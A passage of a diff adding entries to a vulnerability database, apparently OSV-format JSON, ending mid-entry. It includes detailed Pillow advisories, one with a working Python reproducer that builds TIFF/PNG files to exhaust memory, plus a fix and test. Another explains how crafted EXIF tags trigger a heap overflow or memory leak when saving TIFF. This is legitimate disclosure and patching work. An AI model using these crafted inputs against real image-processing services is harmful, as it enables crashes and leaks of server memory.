+                    "0.2.5",
+                    "0.2.6",
+                    "0.2.7",
+                    "0.3.0",
+                    "0.3.1",
+                    "0.4.0",
+                    "0.4.1",
+                    "0.5.0",
+                    "0.5.1",
+                    "0.6.0",
+                    "0.7.0",
+                    "0.7.2",
+                    "0.8.0",
+                    "0.9.0",
+                    "0.9.1",
+                    "0.9.2",
+                    "0.9.3",
+                    "0.9.4",
+                    "0.9.5",
+                    "0.9.6",
+                    "0.9.7",
+                    "0.9.8",
+                    "0.9.9",
+                    "1.0.0",
+                    "1.0.2",
+                    "1.0.3",
+                    "2.0.0",
+                    "2.1.0",
+                    "2.2.0",
+                    "2.3.0",
+                    "2.4.0",
+                    "2.5.0",
+                    "2.6.0",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.1.0",
+                    "3.2.0",
+                    "3.2.1",
+                    "3.2.2",
+                    "3.2.3",
+                    "3.2.4"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2023-48052",
+                "GHSA-8r96-8889-qg2x"
+              ],
+              "details": "Missing SSL certificate validation in HTTPie v3.2.2 allows attackers to eavesdrop on communications between the host and server via a man-in-the-middle attack.",
+              "id": "PYSEC-2023-242",
+              "modified": "2026-06-10T17:01:50.409869827Z",
+              "published": "2023-11-16T18:15:00Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://gxx777.github.io/HTTPie_3.2.2_Cryptographic_API_Misuse_Vulnerability.md"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/advisories/GHSA-8r96-8889-qg2x"
+                }
+              ],
+              "schema_version": "1.7.5",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ]
+            }
+          ]
         },
         {
           "package": {
@@ -94760,6 +95376,26 @@
                 "GHSA-w889-685w-c8fh"
               ],
               "max_severity": "9.2"
+            },
+            {
+              "ids": [
+                "GHSA-wqgw-9xfh-qf2g"
+              ],
+              "aliases": [
+                "CVE-2026-128066",
+                "GHSA-wqgw-9xfh-qf2g"
+              ],
+              "max_severity": ""
+            },
+            {
+              "ids": [
+                "GHSA-xcvg-w56q-r89m"
+              ],
+              "aliases": [
+                "CVE-2026-128067",
+                "GHSA-xcvg-w56q-r89m"
+              ],
+              "max_severity": "8.4"
             }
           ],
           "vulnerabilities": [
@@ -102735,6 +103371,366 @@
                 {
                   "database_specific": {
                     "last_known_affected_version_range": "\u003c= 12.3.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-wqgw-9xfh-qf2g/GHSA-wqgw-9xfh-qf2g.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "pillow",
+                    "purl": "pkg:pypi/pillow"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "13.0.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.0",
+                    "1.1",
+                    "1.2",
+                    "1.3",
+                    "1.4",
+                    "1.5",
+                    "1.6",
+                    "1.7.0",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.7.4",
+                    "1.7.5",
+                    "1.7.6",
+                    "1.7.7",
+                    "1.7.8",
+                    "10.0.0",
+                    "10.0.1",
+                    "10.1.0",
+                    "10.2.0",
+                    "10.3.0",
+                    "10.4.0",
+                    "11.0.0",
+                    "11.1.0",
+                    "11.2.1",
+                    "11.3.0",
+                    "12.0.0",
+                    "12.1.0",
+                    "12.1.1",
+                    "12.2.0",
+                    "12.3.0",
+                    "2.0.0",
+                    "2.1.0",
+                    "2.2.0",
+                    "2.2.1",
+                    "2.2.2",
+                    "2.3.0",
+                    "2.3.1",
+                    "2.3.2",
+                    "2.4.0",
+                    "2.5.0",
+                    "2.5.1",
+                    "2.5.2",
+                    "2.5.3",
+                    "2.6.0",
+                    "2.6.1",
+                    "2.6.2",
+                    "2.7.0",
+                    "2.8.0",
+                    "2.8.1",
+                    "2.8.2",
+                    "2.9.0",
+                    "3.0.0",
+                    "3.1.0",
+                    "3.1.0.rc1",
+                    "3.1.0rc1",
+                    "3.1.1",
+                    "3.1.2",
+                    "3.2.0",
+                    "3.3.0",
+                    "3.3.1",
+                    "3.3.2",
+                    "3.3.3",
+                    "3.4.0",
+                    "3.4.1",
+                    "3.4.2",
+                    "4.0.0",
+                    "4.1.0",
+                    "4.1.1",
+                    "4.2.0",
+                    "4.2.1",
+                    "4.3.0",
+                    "5.0.0",
+                    "5.1.0",
+                    "5.2.0",
+                    "5.3.0",
+                    "5.4.0",
+                    "5.4.0.dev0",
+                    "5.4.1",
+                    "6.0.0",
+                    "6.1.0",
+                    "6.2.0",
+                    "6.2.1",
+                    "6.2.2",
+                    "7.0.0",
+                    "7.1.0",
+                    "7.1.1",
+                    "7.1.2",
+                    "7.2.0",
+                    "8.0.0",
+                    "8.0.1",
+                    "8.1.0",
+                    "8.1.1",
+                    "8.1.2",
+                    "8.2.0",
+                    "8.3.0",
+                    "8.3.1",
+                    "8.3.2",
+                    "8.4.0",
+                    "9.0.0",
+                    "9.0.1",
+                    "9.1.0",
+                    "9.1.1",
+                    "9.2.0",
+                    "9.3.0",
+                    "9.4.0",
+                    "9.5.0"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-128066"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T23:35:39Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "```\n============================================================================\nANT-2026-D7STJUWL  [medium]  CWE-770  dos\nMemory DoS in TIFF and EXIF IFD parsing via overlapping tag data\nLocation: src/PIL/TiffImagePlugin.py:927  in ImageFileDirectory_v2.load()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nA small, crafted image file can make Pillow use thousands of times its own size in memory while the file is only being opened, which lets anyone who can submit an image crash or stall the process handling it. A 144 KB TIFF makes `Image.open()` return normally while holding 1.6 GiB of memory. The largest such standard TIFF, about 786 KB, asks for roughly 48 GiB, which in practice gets the worker killed by the operating system. The file declares a 1×1 image, so the decompression-bomb check never triggers and no warning is raised. There is no memory corruption; the impact is denial of service.\n\nThe bug is in `ImageFileDirectory_v2.load()` in `src/PIL/TiffImagePlugin.py` (around line 927). For every directory entry whose value is stored elsewhere in the file, it reads that value into a new `bytes` object with `ImageFile._safe_read(fp, count * unit_size)` and keeps it in `_tagdata`. `_safe_read()` only checks that the bytes exist. Nothing limits the total read across entries, and nothing stops every entry from pointing at the same bytes. An attacker can therefore give each of N distinct private tags an offset and count that covers the whole file, at a cost of 12 bytes per entry. Memory grows as N × file size, which is quadratic in the file size, and BigTIFF removes the 65,535-entry ceiling.\n\nThe same loop parses EXIF data, so the problem reaches beyond TIFF:\n\n* A 66 KB JPEG APP1 segment costs about 340 MiB inside `Image.open()` itself, via `_read_dpi_from_exif()`.\n* A 96 KB PNG `eXIf` chunk costs 754 MiB on `getexif()` or `ImageOps.exif_transpose()`.\n* WebP EXIF and MPO reach the same code.\n\nThe attached reproducer builds a 72 KB TIFF and a 72 KB PNG. Using only `Image.open()` and `getexif()`, each causes 412 MiB of tag data to be retained, about 6,000 times the file size. The loop dates to the original PIL 1.1.7 import, so every Pillow release since 1.0 is affected.\n\n## Details\n\n`TiffImagePlugin.ImageFileDirectory_v2.load()` reads the out-of-line value of every IFD entry into its own `bytes` object and keeps it in `self._tagdata`. Nothing bounds the sum of those reads, and nothing prevents every entry from pointing at the same region of the file. An IFD with N entries whose `(offset, count)` each cover the whole file therefore costs N × filesize bytes of memory, while the IFD itself costs only 12 bytes per entry. This one loop is the IFD parser for TIFF frames and for `Image.Exif` alike, so it is reachable from `Image.open()` on a TIFF or JPEG and from `getexif()` / `ImageOps.exif_transpose()` on PNG, JPEG, WebP and MPO.\n\nObserved on the stock build at this commit: a valid 144,110-byte 1×1 greyscale TIFF with 12,000 such entries makes `Image.open()` return normally (no exception, no warning, 1 declared pixel so `MAX_IMAGE_PIXELS` is irrelevant) after 1.5 s, with the process RSS grown from 15 MiB to 1,671 MiB and `im.tag_v2` holding 1,649 MiB of tag data for as long as the image object lives. The same IFD placed in the `eXIf` chunk of a 96 KB PNG makes `im.getexif()` retain 754 MiB. A 65,870-byte JPEG whose APP1 `Exif` segment is such an IFD (5,400 entries × 65,519 bytes) allocates ~340 MiB inside `Image.open()` itself, with no further call.\n\n```python\n# src/PIL/TiffImagePlugin.py:902-946  (ImageFileDirectory_v2.load)\nfor i in range(tag_count):\n    tag, typ, count, data = ( … self._unpack(\"HHL4s\", self._ensure_read(fp, 12)))\n    …\n    size = count * unit_size                         # 918: attacker-chosen\n    if size \u003e (8 if self._bigtiff else 4):\n        here = fp.tell()\n        (offset,) = self._unpack(\"Q\" if self._bigtiff else \"L\", data)\n        …\n        fp.seek(offset)                              # 926: attacker-chosen\n        data = ImageFile._safe_read(fp, size)        # 927: new bytes object of `size`\n        fp.seek(here)\n    …\n    self._tagdata[tag] = data                        # 945: kept\n    self.tagtype[tag] = typ\n```\n\n`ImageFile._safe_read()` only guarantees that `size` bytes are actually present in the stream (it reads in `SAFEBLOCK` chunks and raises on truncation); it is a guard against allocating for data that does not exist, not against reading the same existing data many times. For a well-formed file each entry points at its own disjoint value, so the total read is at most the file size. For the crafted file every one of the N entries has a distinct tag number (so none overwrites another in `_tagdata`), type BYTE, `count = filesize - 1` and `offset = 1`; each iteration allocates and fills a fresh `filesize - 1`-byte object and stores it. `load()` does not care whether the tag number is known or whether the type makes sense for it; any 16-bit tag number and any type in `_load_dispatch` is accepted. Memory is `N × filesize`, and since `filesize ≈ 12 N`, it is quadratic in the file size: 12,000 entries / 144 KB → 1.6 GiB (measured); the classic-TIFF maximum of 65,535 entries / 786 KB → ~48 GiB; BigTIFF (`tag_count` is a `Q`) has no 16-bit entry limit at all.\n\nReachability:\n\n- TIFF: `TiffImageFile._open()` (`TiffImagePlugin.py:1187`) → `self._seek(0)` (`:1210`) → `self.tag_v2.load(self.fp)` (`:1258`, and again at `:1271`). This runs inside `Image.open()`, before `load()` and before any size check (`_decompression_bomb_check` only looks at `width × height` and is satisfied by the 1×1 image), and the resulting directory stays referenced as `im.tag_v2`. `_seek()` parses the IFD twice, but `reset()` drops the first copy, so the peak does not double; it is paid again for every frame on `seek()`/`n_frames`.\n- EXIF in other formats: `Image.Exif.load()` / `load_from_fp()` / `_get_ifd_dict()` (`Image.py:4146-4196`, `:4119-4133`) wrap the same `ImageFileDirectory_v2.load()` around the EXIF blob. `PngImagePlugin.chunk_eXIf` (`PngImagePlugin.py:697`) stores the whole chunk as `info[\"exif\"]`, `JpegImagePlugin` concatenates APP1 `Exif` segments into `info[\"exif\"]` (`JpegImagePlugin.py:114-117`), and WebP exposes its EXIF chunk the same way; `im.getexif()`, `ImageOps.exif_transpose()` and `_getexif()` then parse it and keep the values in `im._exif`. For JPEG no explicit call is needed: `JpegImageFile._open()` ends with `self._read_dpi_from_exif()` (`JpegImagePlugin.py:413`), which calls `getexif()` whenever no JFIF DPI is present, so the APP1 IFD is parsed during `Image.open()`. Note that an EXIF blob is parsed into several IFDs (main, EXIF, GPS, Interop via `_get_ifd_dict`), each through its own `load()` call.\n\nThe only failure path in `load()` is `except OSError` → warning; running out of memory is not an `OSError`, so on Linux the realistic outcome for a larger N is the kernel OOM killer terminating the process rather than a Python exception.\n\nThe loop predates Pillow: it came in with the PIL 1.1.7 import in `9a640e315715` (\"Forking PIL\", 2010-07-30) and was carried over unchanged into `ImageFileDirectory_v2`, so every release since 1.0 is affected. The per-tag `_safe_read` bounding added in the CVE-2019-16865 era does not address the sum.\n\n## Impact\n\nAny service that calls `Image.open()` on an uploaded TIFF or JPEG — or `getexif()` / `ImageOps.exif_transpose()` on an uploaded PNG, JPEG or WebP, which thumbnailers routinely do to honour orientation — can be made to allocate and retain memory roughly `entries × filesize`, i.e. thousands of times the upload size, from a file of a few hundred KB that declares a 1×1 image and passes the decompression-bomb check. A ~800 KB TIFF requests ~48 GiB; in practice the worker (or its container) is OOM-killed within seconds, taking down all requests it was serving, and repeated uploads keep it down. No pixel decoding, `load()`, or further API call is required for the TIFF and JPEG cases, `MAX_IMAGE_PIXELS` does not apply, and no `DecompressionBomb*` warning gives the application a chance to refuse the file. There is no memory corruption; the effect is denial of service of the process handling the input.\n\nThis is the same class as CVE-2021-27921/27922/27923 (BLP/ICNS/ICO \"arbitrarily large memory allocations\" from unchecked reported sizes, fixed in 8.1.2) and CVE-2021-28675 (PSD layer count not checked against the data size, DoS on `Image.open()` prior to `load()`), here in the TIFF/EXIF directory parser shared by several formats.\n\n## Reproducing\n\n`repro` is a single Python script that runs against the stock Pillow in `/src`; nothing is compiled. It needs about 1 GB of free RAM (it caps its own address space at 4 GiB so that a larger run ends in `MemoryError` rather than the OOM killer).\n\n**Input.** `aliased_ifd()` builds, in memory, a little-endian classic TIFF: an 8-byte header, one IFD, nothing else. Every crafted entry is a private tag (1000 upwards) of type BYTE with `offset = 1` and `count = file size - 1`, i.e. each claims the whole file body as its value. Each costs 12 bytes in the file but a full file-sized read in `ImageFileDirectory_v2.load()`.\n\n**TIFF path.** The first file adds 8 ordinary tags (ImageWidth = ImageLength = 1, BitsPerSample = 8, no compression, BlackIsZero, one 1-byte strip pointing at a header byte) so that Pillow accepts it as a 1×1 `L` image, plus 6,000 aliased tags (72,110 bytes). Because the image is 1×1, `MAX_IMAGE_PIXELS` never comes into play. The script calls `Image.open()` on it and nothing else: no `load()`, no pixel access.\n\n**EXIF path.** The same 6,000-entry IFD (without the image tags) is passed as `exif=` when saving a 1×1 PNG, so it lands in an `eXIf` chunk; the script opens that PNG and calls `im.getexif()`, which is what `ImageOps.exif_transpose()` calls.\n\n**Check.** For each path the script reads `VmRSS` from `/proc/self/status` before and after, and adds up `len()` over the resulting directory's `_tagdata`. In a well-formed IFD each entry points at its own bytes, so the tag data can never be larger than the file. The script prints `BUG` if both the TIFF's `im.tag_v2` and the PNG's EXIF directory hold more than 2000× the size of their file, otherwise `OK`. On this commit each holds 412 MiB (~6000× the file) and RSS grows by about as much for each.\n\nThe memory cost is entries × file size, and the file size itself grows at 12 bytes per entry, so the cost is quadratic: doubling to 12,000 entries (144 KB) gives the 1.6 GiB quoted above, and the classic-TIFF maximum of 65,535 entries (~786 KB file) comes to ~48 GiB. A JPEG APP1 segment or a WebP EXIF chunk carrying the same IFD behaves like the PNG case (for JPEG, already during `Image.open()`).\n\n## Suggested fix\n\nThe attached patch bounds the out-of-line tag data a single `ImageFileDirectory_v2.load()` call may pull in by the length of the stream it reads from. The values of a well-formed IFD do not overlap, so their total can never exceed the file; only aliased entries can push past it. `load()` now measures the stream once on entry (`fp.seek(0, io.SEEK_END)`, then back to `self._offset`; `load()` already requires a seekable `fp`, since both the TIFF plugin and `Exif` do), keeps a running `total_size` of out-of-line values, and, before the `fp.seek(offset)` / `_safe_read()` at `TiffImagePlugin.py:926-927`, warns `\"Tag data larger than file. Skipping tag …\"` and `continue`s for any entry that would take the total past the file size, in the same warn-and-skip idiom as the existing \"Tag offset too large\" check. No fixed constant is introduced and no valid file changes behaviour, including TIFFs with very large Photoshop/ImageSourceData (tag 37724) payloads, which routinely exceed 64 MB. Because `Image.Exif`, the PNG/JPEG/WebP EXIF paths and MPO all go through this one method, they are covered too. The patch adds `test_tag_data_larger_than_file` to `Tests/test_file_tiff_metadata.py`, next to `test_tag_offset`. With it applied, both paths in the reproducer drop to 1× the file size. One visible side effect: a single oversize entry now skips that tag with this warning instead of aborting the rest of the IFD via the `OSError` path.\n\nA fixed module-level cap in the style of `PngImagePlugin.MAX_TEXT_MEMORY` (e.g. a 64 MiB `TiffImagePlugin.MAX_IFD_DATA`) would be the weaker alternative on its own: a 140 KB file could still retain ~63 MiB per IFD — and a JPEG's EXIF is parsed into several IFDs (main, EXIF, GPS, Interop), so a 66 KB APP1 segment could still request roughly 1000× its size — and legitimate TIFFs with more than 64 MiB of tag data would lose those tags with a warning. It could still be added on top of the stream-length check as a user-adjustable knob.\n\nAn alternative that removes the amplification entirely is to store `(offset, size)` in `_tagdata` and read lazily in `__getitem__`, which is what the class docstring already describes (\"we don't decode tags unless they're asked for\"); that is a larger change because `_tagdata` is shared with `ImageFileDirectory_v1` (`from_v2`/`to_v2`) and exposed as the legacy `tagdata` property, and lazy reads would need the file object to still be open when a tag is first accessed.\n\n## The patch\n\nSkip IFD entries once the total out-of-line tag data read by ImageFileDirectory_v2.load() would exceed the size of the stream\n\nApplies to `src/PIL/TiffImagePlugin.py` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_tiff_metadata.py b/Tests/test_file_tiff_metadata.py\nindex 7b35a0196..ccf923128 100644\n--- a/Tests/test_file_tiff_metadata.py\n+++ b/Tests/test_file_tiff_metadata.py\n@@ -500,6 +500,21 @@ def test_tag_offset() -\u003e None:\n         ifd.load(f)\n \n \n+def test_tag_data_larger_than_file() -\u003e None:\n+    ifd = TiffImagePlugin.ImageFileDirectory_v2()\n+\n+    # Two BYTE tags that both claim the whole 30 byte IFD as their value\n+    tag_count = struct.pack(\"\u003cH\", 2)\n+    tags = struct.pack(\"\u003cHHLL\", 0, 1, 30, 0) + struct.pack(\"\u003cHHLL\", 1, 1, 30, 0)\n+    next_offset = struct.pack(\"\u003cL\", 0)\n+\n+    f = io.BytesIO(tag_count + tags + next_offset)\n+    with pytest.warns(UserWarning, match=\"Tag data larger than file\"):\n+        ifd.load(f)\n+    assert len(ifd[0]) == 30\n+    assert 1 not in ifd\n+\n+\n def test_tag_group_data() -\u003e None:\n     base_ifd = TiffImagePlugin.ImageFileDirectory_v2()\n     interop_ifd = TiffImagePlugin.ImageFileDirectory_v2(group=40965)\ndiff --git a/src/PIL/TiffImagePlugin.py b/src/PIL/TiffImagePlugin.py\nindex 42c1cc96c..c9d506933 100644\n--- a/src/PIL/TiffImagePlugin.py\n+++ b/src/PIL/TiffImagePlugin.py\n@@ -892,6 +892,9 @@ class ImageFileDirectory_v2(_IFDv2Base):\n     def load(self, fp: IO[bytes]) -\u003e None:\n         self.reset()\n         self._offset = fp.tell()\n+        fp.seek(0, io.SEEK_END)\n+        file_size = fp.tell()\n+        fp.seek(self._offset)\n \n         try:\n             tag_count = (\n@@ -899,6 +902,7 @@ class ImageFileDirectory_v2(_IFDv2Base):\n                 if self._bigtiff\n                 else self._unpack(\"H\", self._ensure_read(fp, 2))\n             )[0]\n+            total_size = 0\n             for i in range(tag_count):\n                 tag, typ, count, data = (\n                     self._unpack(\"HHQ8s\", self._ensure_read(fp, 20))\n@@ -923,6 +927,16 @@ class ImageFileDirectory_v2(_IFDv2Base):\n                     if offset \u003e= 2**63:\n                         warnings.warn(\"Tag offset too large\")\n                         continue\n+                    # The values of a well-formed IFD do not overlap, so in\n+                    # total they cannot be larger than the file they are read\n+                    # from. Do not let entries that alias the same bytes load\n+                    # many copies of it.\n+                    total_size += size\n+                    if total_size \u003e file_size:\n+                        warnings.warn(\n+                            f\"Tag data larger than file. Skipping tag {tag}\"\n+                        )\n+                        continue\n                     fp.seek(offset)\n                     data = ImageFile._safe_read(fp, size)\n                     fp.seek(here)\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 2,254 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n# ImageFileDirectory_v2.load(): N IFD entries that all alias the file body make\n# Image.open() (TIFF) and getexif() (PNG eXIf etc.) retain ~N copies of the file.\n# Pure Python, stock Pillow in /src. Needs ~1 GB RAM, runs in ~1 s.\nimport io, struct, resource\nfrom PIL import Image\nresource.setrlimit(resource.RLIMIT_AS, (4 \u003c\u003c 30, 4 \u003c\u003c 30))  # MemoryError, not OOM-killer\n\ndef aliased_ifd(n_alias, real=()):\n    \"\"\"Classic LE TIFF: header + one IFD. n_alias BYTE tags each cover the whole file.\"\"\"\n    n = len(real) + n_alias\n    size = 8 + 2 + 12 * n + 4\n    ents = {t: struct.pack(\"\u003cHHLL\", t, typ, 1, v) for t, (typ, v) in dict(real).items()}\n    for t in range(1000, 1000 + n_alias):\n        ents[t] = struct.pack(\"\u003cHHLL\", t, 1, size - 1, 1)      # BYTE[size-1] @ offset 1\n    blob = b\"II*\\0\" + struct.pack(\"\u003cLH\", 8, n) + b\"\".join(ents[t] for t in sorted(ents)) + b\"\\0\" * 4\n    assert len(blob) == size\n    return blob\n\ndef rss():\n    return next(int(l.split()[1]) \u003c\u003c 10 for l in open(\"/proc/self/status\") if l.startswith(\"VmRSS\"))\n\n# 1) TIFF: 1x1 L image (pixel = a header byte) + 6000 aliased private tags -\u003e Image.open() only\nreal = {256: (3, 1), 257: (3, 1), 258: (3, 8), 259: (3, 1), 262: (3, 1),\n        273: (4, 8), 278: (3, 1), 279: (4, 1)}\ntif = aliased_ifd(6000, real)\nr0 = rss(); im = Image.open(io.BytesIO(tif)); r1 = rss()\nheld_t = sum(len(v) for v in im.tag_v2._tagdata.values())\nprint(f\"TIFF {len(tif)} B, {im.size} {im.mode}: Image.open() keeps {held_t \u003e\u003e 20} MiB of tag data \"\n      f\"({held_t // len(tif)}x file); RSS {r0 \u003e\u003e 20} -\u003e {r1 \u003e\u003e 20} MiB\")\n\n# 2) Same IFD as EXIF in a 1x1 PNG -\u003e im.getexif() (what ImageOps.exif_transpose calls)\nexif = aliased_ifd(6000)\nbuf = io.BytesIO(); Image.new(\"L\", (1, 1)).save(buf, \"PNG\", exif=exif); png = buf.getvalue()\nr0 = rss(); im2 = Image.open(io.BytesIO(png)); e = im2.getexif(); r1 = rss()\nheld_e = sum(len(v) for v in e._info._tagdata.values()) if e._info is not None else 0\nprint(f\"PNG  {len(png)} B: getexif() keeps {held_e \u003e\u003e 20} MiB ({held_e // len(png)}x file); \"\n      f\"RSS {r0 \u003e\u003e 20} -\u003e {r1 \u003e\u003e 20} MiB\")\n\n# A well-formed IFD's values cannot exceed the stream they come from (1x).\nprint(\"BUG\" if held_t \u003e 2000 * len(tif) and held_e \u003e 2000 * len(png) else \"OK\")\n```\n\u003c/details\u003e\n\n---",
+              "id": "GHSA-wqgw-9xfh-qf2g",
+              "modified": "2026-11-12T23:45:03.298534910Z",
+              "published": "2026-11-12T23:35:39Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-wqgw-9xfh-qf2g"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/python-pillow/Pillow/commit/4908edaf7f416616784c7c03d8c1a60153710ffb"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/python-pillow/Pillow/commit/4b63dffd8a6d980fa0e21b40832fa6cbf033eacf"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/python-pillow/Pillow"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/python-pillow/Pillow/releases/tag/13.0.0"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "summary": "Pillow: Memory DoS in TIFF and EXIF IFD parsing via overlapping tag data"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 12.3.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-xcvg-w56q-r89m/GHSA-xcvg-w56q-r89m.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "pillow",
+                    "purl": "pkg:pypi/pillow"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "13.0.0"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "1.0",
+                    "1.1",
+                    "1.2",
+                    "1.3",
+                    "1.4",
+                    "1.5",
+                    "1.6",
+                    "1.7.0",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.7.4",
+                    "1.7.5",
+                    "1.7.6",
+                    "1.7.7",
+                    "1.7.8",
+                    "10.0.0",
+                    "10.0.1",
+                    "10.1.0",
+                    "10.2.0",
+                    "10.3.0",
+                    "10.4.0",
+                    "11.0.0",
+                    "11.1.0",
+                    "11.2.1",
+                    "11.3.0",
+                    "12.0.0",
+                    "12.1.0",
+                    "12.1.1",
+                    "12.2.0",
+                    "12.3.0",
+                    "2.0.0",
+                    "2.1.0",
+                    "2.2.0",
+                    "2.2.1",
+                    "2.2.2",
+                    "2.3.0",
+                    "2.3.1",
+                    "2.3.2",
+                    "2.4.0",
+                    "2.5.0",
+                    "2.5.1",
+                    "2.5.2",
+                    "2.5.3",
+                    "2.6.0",
+                    "2.6.1",
+                    "2.6.2",
+                    "2.7.0",
+                    "2.8.0",
+                    "2.8.1",
+                    "2.8.2",
+                    "2.9.0",
+                    "3.0.0",
+                    "3.1.0",
+                    "3.1.0.rc1",
+                    "3.1.0rc1",
+                    "3.1.1",
+                    "3.1.2",
+                    "3.2.0",
+                    "3.3.0",
+                    "3.3.1",
+                    "3.3.2",
+                    "3.3.3",
+                    "3.4.0",
+                    "3.4.1",
+                    "3.4.2",
+                    "4.0.0",
+                    "4.1.0",
+                    "4.1.1",
+                    "4.2.0",
+                    "4.2.1",
+                    "4.3.0",
+                    "5.0.0",
+                    "5.1.0",
+                    "5.2.0",
+                    "5.3.0",
+                    "5.4.0",
+                    "5.4.0.dev0",
+                    "5.4.1",
+                    "6.0.0",
+                    "6.1.0",
+                    "6.2.0",
+                    "6.2.1",
+                    "6.2.2",
+                    "7.0.0",
+                    "7.1.0",
+                    "7.1.1",
+                    "7.1.2",
+                    "7.2.0",
+                    "8.0.0",
+                    "8.0.1",
+                    "8.1.0",
+                    "8.1.1",
+                    "8.1.2",
+                    "8.2.0",
+                    "8.3.0",
+                    "8.3.1",
+                    "8.3.2",
+                    "8.4.0",
+                    "9.0.0",
+                    "9.0.1",
+                    "9.1.0",
+                    "9.1.1",
+                    "9.2.0",
+                    "9.3.0",
+                    "9.4.0",
+                    "9.5.0"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-128067"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-787"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-12T23:34:43Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              },
+              "details": "```\n============================================================================\nANT-2026-CS7N494P  [high]  CWE-787  memory-safety\nHeap buffer overflow saving TIFF with libtiff when tags override image size\nLocation: src/libImaging/TiffDecode.c:1035  in ImagingLibTiffEncode()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nWhen Pillow saves an image as a compressed TIFF, size information taken from the image's metadata can make the encoder read past the end of a heap buffer. Someone who uploads an image can use this to get the server process's memory, including pointers, copied into the saved file, or to crash the process. When the metadata also enables TIFF \"Predictor=2\" compression, the encoder writes past the buffer instead, corrupting the heap and aborting the process. This affects applications that write TIFF through libtiff (any `compression=` other than raw) and either carry the source metadata across with `exif=im.getexif()` / `tiffinfo=`, or simply re-save a crafted palette TIFF with `Image.open(f).save(out, \"TIFF\")`, which inherits its compression and predictor from the upload.\n\nIn `TiffImagePlugin._save`'s libtiff branch, only `BitsPerSample` is pinned to the real image when the tag list for the encoder is built (`src/PIL/TiffImagePlugin.py:1955`). `ImageWidth`, `ImageLength` and `PlanarConfiguration` are set from `im.size` but are then overwritten by the `exif=`/`tiffinfo=` merge loop at `:1768-1772`. `SamplesPerPixel` is never set for single-band modes, so a value from the caller's tags or from the source TIFF's own IFD reaches `TIFFSetField`. `ImagingLibTiffEncode` then passes a row buffer sized from the actual image (`src/encode.c:291`) to `TIFFWriteScanline` (`src/libImaging/TiffDecode.c:1035`) with no check against `TIFFScanlineSize()`, and libtiff consumes a full scanline of the tag-described width from it.\n\nThe attached reproducer demonstrates the read case. A 64x4 greyscale JPEG whose EXIF says `SamplesPerPixel=3, Photometric=RGB` is converted into a valid RGB TIFF in which 128 bytes of each row are live heap, including pointers that change from run to run. The same JPEG with EXIF `ImageWidth=2**27` kills the process with SIGSEGV. For the write case, the values written are byte-wise differences of existing heap contents rather than attacker-chosen data, and nothing beyond the observed glibc abort is shown. The `tiffinfo=` route dates back to Pillow 2.3.0 (`dbf47837ce99`), and the `exif=` route to 8.4.0 (`c0f619384cbc`).\n\n## Details\n\nWhen an image is saved as TIFF through the libtiff encoder (any `compression=` other than raw, or `TiffImagePlugin.WRITE_LIBTIFF`), libtiff sizes its scanline from the `ImageWidth` / `SamplesPerPixel` / `BitsPerSample` / `PlanarConfiguration` tags it was handed, Pillow sizes the encoder row buffer from the real image, and nothing compares the two. In `TiffImagePlugin._save`'s libtiff branch only `BitsPerSample` is pinned in the attribute dict given to the encoder (`atts`, `src/PIL/TiffImagePlugin.py:1955-1982`); the other geometry tags can come from caller- or attacker-supplied data:\n\n- `ImageWidth` (256), `ImageLength` (257) and `PlanarConfiguration` (284) are set from `im.size` *before* the `tiffinfo=` / `exif=` merge loop at `:1768-1772`, so they are overwritten by it — by the EXIF of an uploaded JPEG, or by stale geometry in `im.getexif()` / `im.tag_v2` of a TIFF that Pillow auto-transposed on load (Orientation tag) or that the application `thumbnail()`ed.\n- `SamplesPerPixel` (277) is only put in the IFD for multi-band modes (`:1847-1850`), so for single-band images (`L`, `P`, `I;16`, `1`, …) a value from `exif=` / `tiffinfo=`, or from the *source TIFF's own IFD* 